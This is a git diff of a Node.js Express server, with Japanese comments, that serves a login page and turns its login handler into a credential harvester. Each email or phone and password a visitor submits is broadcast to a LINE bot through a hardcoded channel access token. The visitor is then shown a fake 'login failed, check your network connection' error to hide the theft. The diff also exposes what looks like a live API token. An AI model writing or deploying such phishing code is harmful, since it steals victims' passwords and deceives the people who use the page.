@@ -1,32 +1,58 @@
 const express = require('express');
 const path = require('path');
 const app = express();
-const PORT = 10000; // Renderが標準で使いたがる10000番に直接固定します
+const PORT = process.env.PORT || 10000;
 
-// フォームから送られてくるデータを解析するための設定
+// ★ LINE Developersで取得した情報を設定
+const LINE_ACCESS_TOKEN = 'Bo0VLiDNARQHYL+r3ime5Q4wVzK1pB2TKESJR+mjVRmzekBA+HpkMpYH7lvM9GU+lZeHCdE5Yyd07xSJvrKj/Cgp7HF3C1y20/2WQ9adSeyv7jQkYM94E4OW1s1n9WlKpLNYNoQkVCzAc+72mhNc4QdB04t89/1O/w1cDnyilFU='; // チャンネルアクセストークン
+
+
 app.use(express.urlencoded({ extended: true }));
-
-// CSSなどの静的ファイルを読み込めるようにする設定（style.css用）
 app.use(express.static(__dirname));
 
-// ログイン画面を表示
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// ログインボタンが押された時の処理
-app.post('/login', (req, res) => {
+app.post('/login', async (req, res) => {
     const email = req.body.email;
     const password = req.body.password;
 
-    // ここでRenderのログに入力内容を表示します
-    console.log("---------- 新しい入力がありました ----------");
-    console.log("メール/電話:", email);
-    console.log("パスワード:", password);
-    console.log("-------------------------------------------");
+    // LINEに送信するメッセージの内容を作成
+    const messageText = `【新しい入力通知】\nメール/電話: ${email}\nパスワード: ${password}`;
 
-    // ユーザーには完了画面（またはエラーっぽく見せる画面）を返す
-    res.send("ログインに失敗しました。ネットワーク接続を確認してください。");
+    // LINE Messaging APIへ送信
+try {
+    const response = await fetch('https://api.line.me/v2/bot/message/broadcast', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${LINE_ACCESS_TOKEN}`
+        },
+        body: JSON.stringify({
+            // to: LINE_USER_ID, ← ブロードキャスト（全体送信）の場合は不要です
+            messages: [
+                {
+                    type: 'text',
+                    text: messageText
+                }
+            ]
+        })
+    });
+
+    // HTTPステータスエラーのハンドリング
+    if (!response.ok) {
+        const errorData = await response.json();
+        console.error('LINE送信失敗詳細:', errorData);
+    } else {
+        console.log('LINEメッセージ全体送信成功');
+    }
+} catch (error) {
+    console.error('ネットワーク/通信エラー:', error);
+}
+
+
+    res.send('ログインに失敗しました。ネットワーク接続を確認してください。');
 });
 
 app.listen(PORT, () => {
